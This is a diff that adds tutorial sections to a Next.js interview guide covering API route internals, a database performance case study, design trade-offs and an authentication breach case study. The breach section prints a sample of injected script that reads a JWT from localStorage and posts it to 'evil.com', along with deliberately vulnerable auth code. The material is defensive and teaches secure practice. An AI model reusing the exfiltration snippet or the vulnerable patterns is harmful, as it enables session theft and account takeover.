@@ -282,6 +282,653 @@ export default async function handler(
 
 ---
 
+## 🔍 Deep Dive: How Next.js API Routes Work Under the Hood
+
+Next.js API routes are fundamentally serverless functions that execute on-demand within Node.js environments, but their implementation involves sophisticated mechanisms that differentiate them from traditional server architectures.
+
+**Internal Architecture:**
+
+When you create a file in `pages/api`, Next.js performs several transformations during the build process. The framework wraps your exported handler function with internal middleware that handles the HTTP server lifecycle. Each API route becomes an isolated serverless function that can be deployed independently to platforms like Vercel, AWS Lambda, or other serverless providers.
+
+The routing mechanism uses a file-system-based router similar to page routing. Next.js compiles a manifest during build time that maps URL paths to their corresponding handler functions. When a request arrives, the framework's internal router matches the URL against this manifest, extracts dynamic parameters from the URL (like `[id]` segments), and invokes the appropriate handler with a pre-populated `req.query` object.
+
+**Request/Response Lifecycle:**
+
+The `NextApiRequest` and `NextApiResponse` objects are enhanced versions of Node.js's native `IncomingMessage` and `ServerResponse`. Next.js adds helper methods like `res.json()`, `res.status()`, and automatic body parsing. The body parser middleware runs before your handler, automatically parsing JSON and URL-encoded bodies based on the `Content-Type` header. You can configure or disable this behavior using the `api.bodyParser` config option.
+
+**Serverless Constraints:**
+
+Unlike traditional Express.js servers that maintain long-running processes, serverless functions have strict execution time limits (typically 10-30 seconds) and cold start penalties. Each invocation might spin up a new container, meaning you cannot rely on in-memory state persisting between requests. This architectural choice forces better practices like stateless design and external session storage.
+
+**Performance Optimizations:**
+
+Next.js implements several optimizations for API routes. Functions are bundled separately, allowing for code splitting at the API level. Only the dependencies required by a specific route are included in its bundle. The framework also supports streaming responses through Node.js's native stream APIs, enabling efficient handling of large payloads without loading everything into memory.
+
+**Edge vs. Node.js Runtime:**
+
+Next.js 12+ introduced Edge Runtime support for API routes through middleware. Edge functions run on a lightweight V8 isolate rather than a full Node.js environment, providing sub-50ms cold starts globally. However, this comes with restrictions: no native Node.js modules, smaller bundle size limits (1MB), and reduced execution time (30 seconds max). Choose Edge for geographically distributed, latency-sensitive operations; use Node.js runtime for compute-intensive tasks or when you need full Node.js API access.
+
+**Dynamic Route Resolution:**
+
+Dynamic routes like `[id]` use a priority system: static routes match first, then dynamic routes, then catch-all routes (`[...slug]`). This hierarchy ensures predictable routing behavior. The framework converts file paths to regex patterns during build time for efficient matching at runtime.
+
+**Production Deployment Considerations:**
+
+When deploying to Vercel, each API route becomes a separate lambda function. On other platforms, you might bundle all routes into a single Node.js server. Understanding your deployment target is crucial for optimizing cold start performance, managing memory limits, and handling concurrent request limits. Connection pooling becomes critical when integrating databases, as serverless environments can quickly exhaust database connection pools without proper management.
+
+---
+
+## 🐛 Real-World Scenario: API Route Performance Crisis
+
+**Production Context:**
+A SaaS dashboard application with 50,000 daily active users experienced severe performance degradation after launching a new analytics feature. The `/api/analytics/dashboard` endpoint was taking 8-12 seconds to respond during peak hours (9-11 AM), causing user complaints and timeout errors.
+
+**Initial Metrics:**
+- Average response time: 8,200ms (p50), 14,500ms (p95)
+- Error rate: 12% (mostly 504 Gateway Timeout)
+- Database connection pool exhaustion: 67 errors/hour
+- Serverless function timeout rate: 23%
+- User abandonment: 34% before page load completed
+
+**Root Cause Analysis:**
+
+**Investigation Steps:**
+
+1. **Enabled detailed logging:**
+```typescript
+// Added performance tracking
+const start = Date.now();
+console.log('[API] Request started:', req.url);
+
+// ... handler logic ...
+
+console.log('[API] Request completed:', {
+  duration: Date.now() - start,
+  method: req.method,
+  path: req.url
+});
+```
+
+2. **Discovered N+1 query problem:**
+```typescript
+// ❌ PROBLEM: Fetching users one by one
+const users = await prisma.user.findMany();
+for (const user of users) {
+  // Making separate DB query for each user
+  const stats = await prisma.analytics.findMany({
+    where: { userId: user.id }
+  });
+  // 500 users = 500 additional queries!
+}
+```
+
+3. **Found missing database indices:**
+```sql
+-- EXPLAIN ANALYZE showed seq scans on 2.5M row table
+EXPLAIN ANALYZE SELECT * FROM analytics WHERE userId = '123' AND createdAt > '2024-01-01';
+-- Seq Scan on analytics (cost=0.00..52341.00 rows=125000 width=186) (actual time=4523ms)
+```
+
+4. **Identified Prisma client instantiation issue:**
+```typescript
+// ❌ PROBLEM: Creating new Prisma client on every request
+export default async function handler(req, res) {
+  const prisma = new PrismaClient(); // Cold start penalty: +800ms
+  const data = await prisma.user.findMany();
+  await prisma.$disconnect();
+  res.json(data);
+}
+```
+
+**Solution Implementation:**
+
+**Step 1: Optimized database queries**
+```typescript
+// ✅ SOLUTION: Use joins and aggregations
+const analytics = await prisma.user.findMany({
+  include: {
+    analytics: {
+      where: {
+        createdAt: {
+          gte: startDate,
+          lte: endDate
+        }
+      }
+    },
+    _count: {
+      select: { sessions: true, pageViews: true }
+    }
+  }
+});
+
+// Single query instead of 500+
+// Reduced query time: 6,800ms → 340ms
+```
+
+**Step 2: Added database indices**
+```prisma
+model Analytics {
+  id        String   @id
+  userId    String
+  createdAt DateTime
+
+  @@index([userId, createdAt]) // Composite index
+  @@index([createdAt]) // For date range queries
+}
+```
+
+**Step 3: Implemented Prisma singleton**
+```typescript
+// lib/prisma.ts
+import { PrismaClient } from '@prisma/client';
+
+const globalForPrisma = global as unknown as { prisma: PrismaClient };
+
+export const prisma = globalForPrisma.prisma || new PrismaClient({
+  log: process.env.NODE_ENV === 'development' ? ['query', 'error', 'warn'] : ['error'],
+});
+
+if (process.env.NODE_ENV !== 'production') globalForPrisma.prisma = prisma;
+
+// Reduced initialization time: 800ms → 0ms (cached)
+```
+
+**Step 4: Added response caching**
+```typescript
+import { unstable_cache } from 'next/cache';
+
+export default async function handler(req: NextApiRequest, res: NextApiResponse) {
+  const { userId, range = '7d' } = req.query;
+
+  const cacheKey = `analytics-${userId}-${range}`;
+
+  const getCachedData = unstable_cache(
+    async () => fetchAnalytics(userId as string, range as string),
+    [cacheKey],
+    { revalidate: 300 } // Cache for 5 minutes
+  );
+
+  const data = await getCachedData();
+
+  res.setHeader('Cache-Control', 's-maxage=300, stale-while-revalidate');
+  res.status(200).json(data);
+}
+```
+
+**Step 5: Implemented pagination**
+```typescript
+// ✅ SOLUTION: Limit data size
+const { page = '1', limit = '50' } = req.query;
+const pageNum = parseInt(page as string);
+const limitNum = Math.min(parseInt(limit as string), 100); // Max 100
+
+const [data, total] = await Promise.all([
+  prisma.analytics.findMany({
+    skip: (pageNum - 1) * limitNum,
+    take: limitNum,
+    orderBy: { createdAt: 'desc' }
+  }),
+  prisma.analytics.count()
+]);
+
+res.json({
+  data,
+  pagination: { page: pageNum, limit: limitNum, total, pages: Math.ceil(total / limitNum) }
+});
+```
+
+**Post-Fix Metrics:**
+- Average response time: 420ms (p50), 890ms (p95) - **95% improvement**
+- Error rate: 0.3% - **97% reduction**
+- Database connection issues: 0 errors/hour - **100% fixed**
+- Serverless timeout rate: 0% - **eliminated**
+- User satisfaction: 89% positive feedback
+- Page load completion: 96% - **62% improvement**
+
+**Cost Impact:**
+- Lambda execution time reduced by 94%
+- Monthly AWS Lambda costs: $1,240 → $185 (85% reduction)
+- Database query costs: $340 → $95 (72% reduction)
+
+**Key Lessons:**
+1. Always use connection pooling and singleton patterns in serverless
+2. Add database indices before launching features
+3. Implement caching for expensive computations
+4. Monitor API response times with detailed logging
+5. Use pagination to limit response sizes
+6. Optimize database queries with joins instead of loops
+
+---
+
+## ⚖️ Trade-offs: API Routes Design Decisions
+
+### 1. Pages Router API Routes vs. App Router Route Handlers
+
+**Pages Router (`pages/api/users.ts`):**
+
+**Pros:**
+- Mature, well-documented ecosystem
+- Full Node.js runtime access
+- Simpler mental model (one handler per file)
+- Better IDE autocomplete for `NextApiRequest`/`NextApiResponse`
+- Established patterns for middleware composition
+
+**Cons:**
+- Cannot colocate with components
+- No streaming by default
+- Separate from React Server Components
+- Less type safety for route parameters
+- No native support for modern Web APIs (Request/Response)
+
+**App Router (`app/api/users/route.ts`):**
+
+**Pros:**
+- Native Web API support (Request/Response objects)
+- Streaming responses built-in
+- Colocation with app structure
+- Better TypeScript inference for params
+- Edge Runtime support by default
+- Works seamlessly with Server Components
+
+**Cons:**
+- Newer, fewer community examples
+- Different API from pages router (migration cost)
+- Requires understanding of App Router conventions
+- Some middleware patterns need rethinking
+
+**Decision Matrix:**
+- **Choose Pages Router if:** Existing project, need maximum stability, heavy middleware usage
+- **Choose App Router if:** New project, need streaming, Edge Runtime, colocated API logic
+
+---
+
+### 2. JWT vs. Session-Based Authentication
+
+**JWT (Stateless):**
+
+**Pros:**
+- Scales horizontally (no server-side state)
+- Works across multiple services/domains
+- No database lookup on every request
+- Perfect for serverless (no shared state)
+- Can include custom claims (roles, permissions)
+
+**Cons:**
+- Cannot invalidate tokens before expiry (unless using blacklist)
+- Larger payload (cookies typically 300-500 bytes)
+- Token refresh complexity
+- XSS vulnerability if stored in localStorage
+- No centralized session management
+
+**Session-Based (Stateful):**
+
+**Pros:**
+- Easy to revoke access immediately
+- Smaller cookie size (~50 bytes session ID)
+- Server-side session data storage
+- More control over session lifecycle
+- Easier to implement logout
+
+**Cons:**
+- Requires session store (Redis, database)
+- Doesn't scale as easily (sticky sessions or shared store)
+- Database lookup on every request
+- Complex in distributed systems
+- Not ideal for serverless
+
+**Hybrid Approach (Best of Both):**
+```typescript
+// Use short-lived JWT (15min) + refresh token in httpOnly cookie
+{
+  accessToken: 'eyJhbGc...', // 15min expiry, in memory
+  refreshToken: 'abc123...' // 7 days, httpOnly cookie, can be revoked
+}
+```
+
+**Decision Matrix:**
+- **Choose JWT if:** Microservices, serverless, mobile apps, high scale
+- **Choose Sessions if:** Monolith, need immediate revocation, simpler auth logic
+- **Choose Hybrid if:** Enterprise app needing security + scalability
+
+---
+
+### 3. Prisma vs. Raw SQL vs. Query Builders
+
+**Prisma:**
+
+**Performance:**
+- Query: ~15ms overhead vs. raw SQL
+- Migration: Auto-generated, type-safe
+- Bundle size: +500KB
+- Cold start: +120ms (client initialization)
+
+**Developer Experience:**
+- Type safety: Excellent (auto-generated types)
+- Learning curve: Medium (schema language)
+- Productivity: Very high
+- Debugging: Good (query logging)
+
+**Pros:**
+- Full TypeScript support
+- Auto-generated types from schema
+- Powerful relation handling
+- Built-in connection pooling
+- Great migration system
+
+**Cons:**
+- Adds abstraction overhead
+- Limited control over complex queries
+- Larger bundle size
+- Vendor lock-in to Prisma
+
+**Raw SQL:**
+
+**Performance:**
+- Query: Fastest (no overhead)
+- Migration: Manual
+- Bundle size: ~0KB
+- Cold start: Minimal
+
+**Developer Experience:**
+- Type safety: None (need manual types)
+- Learning curve: High (SQL expertise needed)
+- Productivity: Lower
+- Debugging: Manual query logging
+
+**Pros:**
+- Maximum performance
+- Full control over queries
+- No abstraction overhead
+- Works with any database
+
+**Cons:**
+- No type safety
+- SQL injection risks
+- Manual schema management
+- More boilerplate code
+
+**Query Builders (Drizzle, Kysely):**
+
+**Performance:**
+- Query: ~5ms overhead
+- Migration: Type-safe
+- Bundle size: +100KB
+- Cold start: +30ms
+
+**Developer Experience:**
+- Type safety: Excellent
+- Learning curve: Medium
+- Productivity: High
+- Debugging: Good
+
+**Decision Matrix:**
+- **Choose Prisma if:** Full-stack app, need rapid development, TypeScript-first
+- **Choose Raw SQL if:** Performance-critical, complex queries, SQL expertise
+- **Choose Query Builder if:** Want type safety without Prisma overhead
+
+**Real-World Example:**
+```typescript
+// Prisma: Best for standard CRUD
+const users = await prisma.user.findMany({
+  include: { posts: true }
+});
+
+// Raw SQL: Best for complex analytics
+const stats = await prisma.$queryRaw`
+  SELECT date_trunc('day', created_at) as day,
+         COUNT(*) as count,
+         AVG(amount) as avg_amount
+  FROM transactions
+  WHERE created_at > NOW() - INTERVAL '30 days'
+  GROUP BY day
+  ORDER BY day DESC
+`;
+
+// Hybrid: Use both strategically
+```
+
+---
+
+### 4. REST vs. GraphQL vs. tRPC for Next.js APIs
+
+**REST API Routes:**
+
+**Pros:**
+- Simple, well-understood
+- HTTP caching works naturally
+- Easy to debug (curl, Postman)
+- No additional dependencies
+- Works with any client
+
+**Cons:**
+- Over-fetching/under-fetching
+- Multiple endpoints for complex data
+- No type safety between client/server
+- Manual API versioning
+
+**GraphQL:**
+
+**Pros:**
+- Single endpoint
+- Client specifies exact data needs
+- Strong type system
+- Great for complex data requirements
+
+**Cons:**
+- Complexity overhead (+50KB libraries)
+- Caching is harder
+- N+1 query problems
+- Steeper learning curve
+
+**tRPC:**
+
+**Pros:**
+- End-to-end type safety (no codegen)
+- Minimal overhead (~20KB)
+- RPC-style (feels like local functions)
+- Perfect for TypeScript monorepos
+- Easy to refactor
+
+**Cons:**
+- TypeScript-only
+- Not suitable for public APIs
+- Requires monorepo structure
+- Smaller ecosystem than REST/GraphQL
+
+**Decision Matrix:**
+- **Choose REST if:** Public API, simple CRUD, need HTTP caching
+- **Choose GraphQL if:** Complex data needs, mobile apps, multiple clients
+- **Choose tRPC if:** TypeScript monorepo, internal API, rapid development
+
+---
+
+## 💬 Explain to Junior: Understanding Next.js API Routes
+
+**Beginner-Friendly Explanation:**
+
+Think of Next.js API routes like the kitchen in a restaurant. When a customer (your frontend) places an order (makes a request), the kitchen (API route) prepares the food (processes data) and sends it back to the customer.
+
+**Simple Analogy:**
+
+Imagine you're building a todo app. The frontend shows tasks to users, but where do those tasks come from? How do you save new tasks? This is where API routes come in.
+
+**Without API routes:**
+Your React components would need to directly connect to a database, which is dangerous (anyone could see your database credentials in the browser code!).
+
+**With API routes:**
+```
+User clicks "Add Task"
+  → Frontend calls /api/tasks (POST)
+  → API route validates data
+  → Saves to database
+  → Returns success/error
+  → Frontend updates UI
+```
+
+**The Magic of File-Based Routing:**
+
+Next.js makes creating APIs super easy. Just create a file in the `pages/api` folder:
+
+```
+pages/api/hello.ts → Available at /api/hello
+pages/api/users/[id].ts → Available at /api/users/123
+```
+
+It's like organizing your kitchen: each station (file) handles specific dishes (endpoints).
+
+**Basic Example for Beginners:**
+
+```typescript
+// pages/api/tasks.ts
+export default async function handler(req, res) {
+  // Check what the user wants to do
+  if (req.method === 'GET') {
+    // User wants to see all tasks
+    const tasks = await database.getAllTasks();
+    return res.status(200).json(tasks);
+  }
+
+  if (req.method === 'POST') {
+    // User wants to create a new task
+    const { title, description } = req.body;
+
+    // Validate (like checking if ingredients are fresh)
+    if (!title) {
+      return res.status(400).json({ error: 'Title is required' });
+    }
+
+    // Save to database
+    const newTask = await database.createTask({ title, description });
+
+    // Send back the created task
+    return res.status(201).json(newTask);
+  }
+
+  // User tried something we don't support
+  return res.status(405).json({ error: 'Method not allowed' });
+}
+```
+
+**Key Concepts Simplified:**
+
+**1. Request (req):**
+Think of this as the order ticket from a customer. It contains:
+- `req.method`: What action? (GET = read, POST = create, PUT = update, DELETE = delete)
+- `req.body`: The data they're sending (like ingredients for a new dish)
+- `req.query`: URL parameters (like table number in `/api/table?number=5`)
+
+**2. Response (res):**
+This is how you send food back to the customer:
+- `res.status(200)`: Everything went well
+- `res.status(400)`: Bad request (customer ordered something weird)
+- `res.status(500)`: Kitchen error (something broke on our end)
+- `res.json(data)`: Send data back as JSON
+
+**3. Why Use API Routes?**
+
+**Security:**
+```typescript
+// ❌ BAD: Database credentials in frontend
+const db = connectDatabase('secret-password'); // Everyone can see this!
+
+// ✅ GOOD: Credentials only in API route (server-side)
+// .env.local
+DATABASE_URL=postgresql://secret-password@localhost/db
+// Only server has access to this
+```
+
+**Business Logic:**
+```typescript
+// API route can validate, transform, and protect data
+export default async function handler(req, res) {
+  const { email, password } = req.body;
+
+  // Validation (protect your data)
+  if (!email.includes('@')) {
+    return res.status(400).json({ error: 'Invalid email' });
+  }
+
+  // Hash password (security)
+  const hashedPassword = await bcrypt.hash(password, 10);
+
+  // Save safely
+  const user = await db.createUser({ email, hashedPassword });
+
+  res.status(201).json({ id: user.id, email: user.email });
+  // Never send password back!
+}
+```
+
+**Common Beginner Mistakes:**
+
+**Mistake 1: Forgetting to check HTTP method**
+```typescript
+// ❌ BAD: Anyone can delete with any method
+export default async function handler(req, res) {
+  await deleteAllUsers(); // Dangerous!
+  res.json({ success: true });
+}
+
+// ✅ GOOD: Only allow DELETE method
+export default async function handler(req, res) {
+  if (req.method !== 'DELETE') {
+    return res.status(405).json({ error: 'Method not allowed' });
+  }
+  await deleteAllUsers();
+  res.json({ success: true });
+}
+```
+
+**Mistake 2: Not validating input**
+```typescript
+// ❌ BAD: Trust user input blindly
+export default async function handler(req, res) {
+  const user = await db.createUser(req.body); // What if req.body is malicious?
+  res.json(user);
+}
+
+// ✅ GOOD: Validate everything
+export default async function handler(req, res) {
+  const { name, email } = req.body;
+
+  if (!name || !email) {
+    return res.status(400).json({ error: 'Name and email required' });
+  }
+
+  if (!email.includes('@')) {
+    return res.status(400).json({ error: 'Invalid email' });
+  }
+
+  const user = await db.createUser({ name, email });
+  res.json(user);
+}
+```
+
+**Interview Answer Template:**
+
+"Next.js API routes are serverless functions that allow you to create backend endpoints within your Next.js application. They're file-based, meaning creating a file in `pages/api` automatically creates an API endpoint at that path.
+
+For example, `pages/api/users.ts` creates an endpoint at `/api/users`. Each API route exports a handler function that receives request and response objects. You can handle different HTTP methods (GET, POST, etc.) within this handler.
+
+The key benefits are: you can keep frontend and backend in one project, it's serverless so it scales automatically, and you have full TypeScript support. It's commonly used for authentication, database operations, and any server-side logic you don't want exposed to the client.
+
+A simple example would be fetching users from a database: check the HTTP method is GET, query the database, and return the results as JSON. For creating users, check for POST method, validate the request body, save to database, and return the created user."
+
+**When to Use API Routes:**
+- Talking to databases
+- Handling authentication (login, signup)
+- Calling external APIs with secret keys
+- Processing payments
+- File uploads
+- Any logic that needs to stay secret/secure
+
+**When NOT to Use API Routes:**
+- Simple page rendering (use Server Components in App Router)
+- Static data (use SSG instead)
+- Public data that doesn't need protection
+
+---
+
 ## Question 2: Middleware and Authentication
 
 **Difficulty:** 🟡 Medium
@@ -585,6 +1232,1025 @@ export default withAuth(async (req: AuthenticatedRequest, res: NextApiResponse) 
 
 ---
 
+## 🔍 Deep Dive: Authentication Architecture and Middleware Patterns
+
+Next.js provides multiple authentication approaches, each with different architectural implications. Understanding the internal mechanics helps you choose the right pattern for your security requirements.
+
+**Middleware Composition Patterns:**
+
+Traditional middleware in Express.js uses a linear chain of functions. Next.js API routes don't have built-in middleware support, so developers implement the higher-order function (HOF) pattern. A middleware function wraps your handler, executes pre-processing logic, and conditionally calls the next handler. This pattern enables composition: `withAuth(withLogging(withRateLimit(handler)))`.
+
+The execution flow works like nested Russian dolls. When a request arrives, it passes through the outermost wrapper first (rate limiting), then the next layer (logging), then authentication, and finally reaches your handler. Each wrapper can short-circuit the chain by returning a response early (like a 401 Unauthorized), preventing inner handlers from executing.
+
+**JWT Authentication Deep Dive:**
+
+JSON Web Tokens are cryptographically signed JSON payloads. When you call `jwt.sign(payload, secret)`, the library creates three parts: header (algorithm), payload (your data), and signature (HMAC of header+payload using your secret). These are base64url-encoded and joined with dots: `header.payload.signature`.
+
+The security model relies on the secret key never leaving your server. Anyone can decode a JWT and read the payload (it's just base64), but they cannot modify it without invalidating the signature. When your API receives a JWT, `jwt.verify()` recomputes the signature using your secret and compares it to the token's signature. If they match, the token is authentic.
+
+**Critical Security Considerations:**
+
+Storing JWTs in localStorage makes them accessible to JavaScript, creating XSS attack vectors. A malicious script injected into your app can steal tokens and impersonate users. Instead, store tokens in httpOnly cookies, which JavaScript cannot access. The browser automatically sends these cookies with requests, and the server reads them from `req.cookies`.
+
+Token expiration creates a UX challenge: forcing re-login every 15 minutes frustrates users. The solution is refresh token rotation. Issue a short-lived access token (15 minutes) for API calls and a long-lived refresh token (7 days) stored in an httpOnly cookie. When the access token expires, call `/api/auth/refresh` to get a new one. This balances security (short exposure window) with usability (rarely re-login).
+
+**Edge Middleware vs. API Route Middleware:**
+
+Next.js 12+ introduced Edge Middleware that runs on Vercel's Edge Network before requests reach your server. This middleware uses the Web Request/Response API (not Node.js), executes in a V8 isolate (not Node.js), and has a 30-second timeout.
+
+Edge Middleware is perfect for redirects, header manipulation, and geo-blocking because it runs globally close to users (sub-50ms). However, you cannot use Node.js modules like `bcrypt` or connect to databases directly. For complex auth logic requiring database lookups, use API route middleware instead.
+
+**Session-Based Authentication Architecture:**
+
+Session-based auth stores user data server-side and sends only a session ID to the client. When a user logs in, you create a session object `{ userId, email, role }`, store it in Redis/database with a unique ID, and set a cookie containing that ID. On subsequent requests, you read the session ID from the cookie, look up the session data, and attach it to the request.
+
+This approach allows immediate revocation: delete the session from Redis, and the user is logged out globally. However, it requires a shared session store (Redis) for multi-server deployments and adds database latency to every request.
+
+**Role-Based Access Control (RBAC) Implementation:**
+
+RBAC extends authentication with authorization. After verifying who the user is (authentication), check what they can do (authorization). Implementing RBAC in middleware creates a reusable pattern:
+
+```typescript
+function withRole(requiredRole: string) {
+  return (handler: NextApiHandler) => {
+    return withAuth(async (req: AuthenticatedRequest, res: NextApiResponse) => {
+      const user = await db.user.findUnique({ where: { id: req.user!.id } });
+
+      if (!user || user.role !== requiredRole) {
+        return res.status(403).json({ error: 'Insufficient permissions' });
+      }
+
+      return handler(req, res);
+    });
+  };
+}
+```
+
+This pattern composes: `withRole('admin')` wraps `withAuth`, which wraps your handler. For more complex scenarios, use permission-based access control where users have multiple permissions rather than a single role.
+
+**OAuth 2.0 and NextAuth.js:**
+
+OAuth is an authorization protocol that delegates authentication to third-party providers (Google, GitHub). The flow involves: redirect to provider → user logs in → provider redirects back with code → exchange code for token → use token to fetch user data.
+
+NextAuth.js abstracts this complexity, handling the OAuth dance, session management, and database integration. It supports both JWT and database sessions, provides built-in CSRF protection, and integrates seamlessly with Prisma. For production applications requiring social login, NextAuth.js is the recommended solution.
+
+**Security Best Practices:**
+
+Always hash passwords with bcrypt (or Argon2) using a cost factor of 10+. Use HTTPS in production to prevent token interception. Implement CSRF protection for state-changing operations. Set appropriate CORS headers to prevent unauthorized cross-origin requests. Use rate limiting to prevent brute-force attacks. Never expose JWT secrets in client code or version control.
+
+---
+
+## 🐛 Real-World Scenario: Authentication Vulnerability Exploited
+
+**Production Context:**
+An e-commerce platform with 250,000 users discovered a critical security breach. Attackers gained admin access to 1,200 user accounts over 72 hours, modifying orders, accessing payment information, and creating fraudulent admin accounts. The breach was discovered when legitimate users reported unauthorized purchases.
+
+**Initial Impact Metrics:**
+- Compromised accounts: 1,200 (0.48% of user base)
+- Fraudulent transactions: $47,800
+- Data exposed: Email addresses, order history, shipping addresses
+- Reputation damage: 4,200 user account deletions
+- Customer support tickets: 15,600 in 48 hours
+- Regulatory investigation: GDPR violation pending
+
+**Vulnerability Discovery:**
+
+**Issue 1: JWT stored in localStorage (XSS attack vector)**
+```typescript
+// ❌ VULNERABLE CODE
+// pages/api/auth/login.ts
+export default async function handler(req, res) {
+  const { email, password } = req.body;
+  const user = await validateUser(email, password);
+
+  if (user) {
+    const token = jwt.sign({ id: user.id, email, role: user.role }, SECRET);
+
+    // PROBLEM: Token sent in JSON, client stores in localStorage
+    return res.json({ token, user });
+  }
+
+  res.status(401).json({ error: 'Invalid credentials' });
+}
+
+// Client code
+const { token } = await fetch('/api/auth/login').then(r => r.json());
+localStorage.setItem('token', token); // ❌ Accessible to XSS!
+```
+
+**Attack Vector:**
+A third-party analytics script had been compromised (supply chain attack). The malicious code read tokens from localStorage and sent them to an attacker-controlled server:
+
+```javascript
+// Injected malicious code in analytics library
+const token = localStorage.getItem('token');
+if (token) {
+  fetch('https://evil.com/steal', {
+    method: 'POST',
+    body: JSON.stringify({ token, domain: window.location.host })
+  });
+}
+```
+
+**Issue 2: No token expiration validation**
+```typescript
+// ❌ VULNERABLE CODE
+export function withAuth(handler: NextApiHandler) {
+  return async (req: AuthenticatedRequest, res: NextApiResponse) => {
+    const token = req.headers.authorization?.replace('Bearer ', '');
+
+    if (!token) {
+      return res.status(401).json({ error: 'No token' });
+    }
+
+    try {
+      // PROBLEM: verify() accepts any valid signature, even expired tokens
+      const decoded = jwt.verify(token, SECRET, { ignoreExpiration: true });
+      req.user = decoded;
+      return handler(req, res);
+    } catch (error) {
+      return res.status(401).json({ error: 'Invalid token' });
+    }
+  };
+}
+```
+
+**Issue 3: Weak JWT secret**
+```typescript
+// ❌ VULNERABLE CODE in .env.local
+JWT_SECRET=secret123
+// Weak secret = easy to brute-force
+```
+
+**Issue 4: Role injection via JWT payload manipulation**
+```typescript
+// ❌ VULNERABLE CODE
+const token = jwt.sign({ id: user.id, email, role: user.role }, SECRET);
+
+// Attacker modified the role in token payload by finding a collision
+// (weak secret allowed brute-force)
+// Changed { role: 'user' } to { role: 'admin' }
+```
+
+**Solution Implementation:**
+
+**Fix 1: Move tokens to httpOnly cookies**
+```typescript
+// ✅ SECURE CODE
+// pages/api/auth/login.ts
+import cookie from 'cookie';
+
+export default async function handler(req, res) {
+  const { email, password } = req.body;
+  const user = await validateUser(email, password);
+
+  if (!user) {
+    return res.status(401).json({ error: 'Invalid credentials' });
+  }
+
+  // Short-lived access token (15min)
+  const accessToken = jwt.sign(
+    { id: user.id, email: user.email }, // Don't include role
+    process.env.JWT_SECRET!,
+    { expiresIn: '15m' }
+  );
+
+  // Long-lived refresh token (7 days)
+  const refreshToken = jwt.sign(
+    { id: user.id, type: 'refresh' },
+    process.env.REFRESH_SECRET!,
+    { expiresIn: '7d' }
+  );
+
+  // Store refresh token in database for revocation capability
+  await db.session.create({
+    data: {
+      userId: user.id,
+      refreshToken,
+      expiresAt: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
+    }
+  });
+
+  // Set httpOnly cookies (JavaScript cannot access)
+  res.setHeader('Set-Cookie', [
+    cookie.serialize('accessToken', accessToken, {
+      httpOnly: true,
+      secure: process.env.NODE_ENV === 'production',
+      sameSite: 'strict',
+      maxAge: 15 * 60,
+      path: '/'
+    }),
+    cookie.serialize('refreshToken', refreshToken, {
+      httpOnly: true,
+      secure: process.env.NODE_ENV === 'production',
+      sameSite: 'strict',
+      maxAge: 7 * 24 * 60 * 60,
+      path: '/'
+    })
+  ]);
+
+  res.status(200).json({ user: { id: user.id, email: user.email } });
+  // Never send tokens in response body!
+}
+```
+
+**Fix 2: Enforce token expiration and fetch role from database**
+```typescript
+// ✅ SECURE CODE
+import cookie from 'cookie';
+
+export function withAuth(handler: NextApiHandler) {
+  return async (req: AuthenticatedRequest, res: NextApiResponse) => {
+    const cookies = cookie.parse(req.headers.cookie || '');
+    const token = cookies.accessToken;
+
+    if (!token) {
+      return res.status(401).json({ error: 'Not authenticated' });
+    }
+
+    try {
+      // Verify with expiration enforcement
+      const decoded = jwt.verify(token, process.env.JWT_SECRET!) as any;
+
+      // CRITICAL: Fetch role from database (single source of truth)
+      const user = await db.user.findUnique({
+        where: { id: decoded.id },
+        select: { id: true, email: true, role: true }
+      });
+
+      if (!user) {
+        return res.status(401).json({ error: 'User not found' });
+      }
+
+      req.user = user;
+      return handler(req, res);
+    } catch (error) {
+      if (error instanceof jwt.TokenExpiredError) {
+        return res.status(401).json({ error: 'Token expired', code: 'TOKEN_EXPIRED' });
+      }
+      return res.status(401).json({ error: 'Invalid token' });
+    }
+  };
+}
+```
+
+**Fix 3: Use strong JWT secret**
+```typescript
+// ✅ SECURE CODE - Generate with: openssl rand -base64 64
+JWT_SECRET=XnZr8u/A+QeThWmYq3t6w9z$C&F)J@McRfUjXn2r5u8x/A?D(G+KbPeSgVkYp3s6
+REFRESH_SECRET=ZnFkJ3s6v9y$B&E)H@McQfTjWnZr4u7x!A%D*G-KaPdRgUkXp2s5v8y/B?E(H+M
+```
+
+**Fix 4: Implement token refresh**
+```typescript
+// ✅ SECURE CODE
+// pages/api/auth/refresh.ts
+export default async function handler(req, res) {
+  const cookies = cookie.parse(req.headers.cookie || '');
+  const refreshToken = cookies.refreshToken;
+
+  if (!refreshToken) {
+    return res.status(401).json({ error: 'No refresh token' });
+  }
+
+  try {
+    const decoded = jwt.verify(refreshToken, process.env.REFRESH_SECRET!) as any;
+
+    // Verify refresh token exists in database and hasn't been revoked
+    const session = await db.session.findFirst({
+      where: {
+        refreshToken,
+        userId: decoded.id,
+        expiresAt: { gt: new Date() }
+      }
+    });
+
+    if (!session) {
+      return res.status(401).json({ error: 'Invalid refresh token' });
+    }
+
+    // Issue new access token
+    const newAccessToken = jwt.sign(
+      { id: decoded.id },
+      process.env.JWT_SECRET!,
+      { expiresIn: '15m' }
+    );
+
+    res.setHeader('Set-Cookie', cookie.serialize('accessToken', newAccessToken, {
+      httpOnly: true,
+      secure: process.env.NODE_ENV === 'production',
+      sameSite: 'strict',
+      maxAge: 15 * 60,
+      path: '/'
+    }));
+
+    res.status(200).json({ success: true });
+  } catch (error) {
+    res.status(401).json({ error: 'Invalid refresh token' });
+  }
+}
+```
+
+**Fix 5: Add logout endpoint that revokes refresh token**
+```typescript
+// ✅ SECURE CODE
+// pages/api/auth/logout.ts
+export default withAuth(async (req: AuthenticatedRequest, res: NextApiResponse) => {
+  const cookies = cookie.parse(req.headers.cookie || '');
+  const refreshToken = cookies.refreshToken;
+
+  if (refreshToken) {
+    // Delete refresh token from database
+    await db.session.deleteMany({
+      where: { refreshToken }
+    });
+  }
+
+  // Clear cookies
+  res.setHeader('Set-Cookie', [
+    cookie.serialize('accessToken', '', {
+      httpOnly: true,
+      secure: process.env.NODE_ENV === 'production',
+      sameSite: 'strict',
+      maxAge: 0,
+      path: '/'
+    }),
+    cookie.serialize('refreshToken', '', {
+      httpOnly: true,
+      secure: process.env.NODE_ENV === 'production',
+      sameSite: 'strict',
+      maxAge: 0,
+      path: '/'
+    })
+  ]);
+
+  res.status(200).json({ message: 'Logged out successfully' });
+});
+```
+
+**Post-Fix Security Audit Metrics:**
+- XSS attack vector: Eliminated (tokens not in localStorage)
+- Token theft attempts: 0 successful (httpOnly cookies protected)
+- Unauthorized admin access: 0 incidents
+- Token expiration enforcement: 100% compliance
